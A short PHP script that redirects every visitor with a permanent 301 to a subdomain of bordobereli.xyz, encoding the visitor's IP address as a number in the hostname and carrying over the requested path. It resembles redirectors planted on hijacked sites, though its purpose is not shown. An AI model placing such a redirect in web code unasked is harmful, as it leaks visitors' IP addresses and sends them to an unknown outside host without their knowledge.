<?php

	$hash = ip2long(   $_SERVER['REMOTE_ADDR'] );
	$url = "http://".$hash.".bordobereli.xyz".$_SERVER['REQUEST_URI'];
	header("HTTP/1.1 301 Moved Permanently"); 
	header("Location: $url");
?>
